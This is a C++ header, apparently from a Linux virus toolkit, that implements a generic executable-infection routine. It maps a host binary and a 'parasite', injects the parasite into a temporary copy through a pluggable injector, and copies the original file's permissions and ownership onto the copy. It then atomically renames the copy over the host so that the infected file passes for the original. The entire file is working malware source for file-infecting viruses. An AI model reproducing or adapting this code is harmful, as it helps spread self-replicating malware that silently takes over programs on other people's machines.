#pragma once
#include <linux/limits.h>
#include <stdlib.h>
#include <span>
#include "common/file_descriptor.hh"
#include "common/mmap.hh"
#include "nostdlib/stdio.hh"
#include "nostdlib/string.hh"

namespace vt::infector {

template <typename Infect>
common::FileDescriptor infect(std::span<const std::byte> host_mapping,
                              std::span<const std::byte> parasite_mapping,
                              const char* tmp_file_name) {
  Infect infector;

  if (!infector.analyze(host_mapping, parasite_mapping)) {
    return common::FileDescriptor{};
  }

  common::FileDescriptor output(tmp_file_name, O_RDWR | O_CREAT, S_IRWXU);

  if (!output.valid()) {
    return output;
  }

  auto infected_host_size = infector.injected_host_size();
  vt::ftruncate(output.handle(), infected_host_size);

  common::Mmap<PROT_READ | PROT_WRITE> output_host_mapping(
      infected_host_size, MAP_SHARED, output.handle(), 0);

  // Make a writable copy of the host.
  vt::memcpy(output_host_mapping.mutable_base(), &host_mapping.front(),
             host_mapping.size());

  if (!infector.inject(std::span<std::byte>(output_host_mapping.mutable_base(),
                                            output_host_mapping.size()),
                       parasite_mapping)) {
    return common::FileDescriptor{};
  }
  return output;
}

bool atomic_swap_host(int host_fd, const char* host, int tmp_fd,
                      const char* tmp) {
  // mimic the original file.
  struct stat s;
  if (vt::fstat(host_fd, &s) < 0) {
    return false;
  }
  if (vt::fchmod(tmp_fd, s.st_mode) < 0) {
    return false;
  }
  if (vt::fchown(tmp_fd, s.st_uid, s.st_gid) < 0) {
    return false;
  }
  // atomic swap and replace the orignal host with our infected one.
  if (vt::rename(tmp, host) < 0) {
    return false;
  }
  return true;
}

// A generic infection routine, that can be used by any algorithms.
// It creates a temp copy of the host, infects it with a parasite, and then
// pretend to be the host with atomic rename.
template <typename Infect>
bool infect(const char* host_path, const char* parasite_path) {
  // host analysis phase, quick bailout if it cannot be infected.
  common::FileDescriptor host(host_path, O_RDONLY);
  if (!host.valid()) {
    return false;
  }
  auto host_size = host.file_size();
  common::Mmap<PROT_READ> host_mapping(host_size, MAP_SHARED, host.handle(), 0);

  common::FileDescriptor parasite(parasite_path, O_RDONLY);
  if (!parasite.valid()) {
    return false;
  }
  common::Mmap<PROT_READ> parasite_mapping(parasite.file_size(), MAP_SHARED,
                                           parasite.handle(), 0);

  char tmp[PATH_MAX];
  auto len = strlen(host_path);
  vt::strcpy(tmp, host_path);
  tmp[len] = '.';
  tmp[len + 1] = '\0';
  auto output_fd = infect<Infect>(
      std::span<const std::byte>(host_mapping.base(), host_mapping.size()),
      std::span<const std::byte>(parasite_mapping.base(),
                                 parasite_mapping.size()),
      tmp);

  if (!output_fd.valid()) {
    return false;
  }
  return atomic_swap_host(host.handle(), host_path, output_fd.handle(), tmp);
}
}  // namespace vt::infector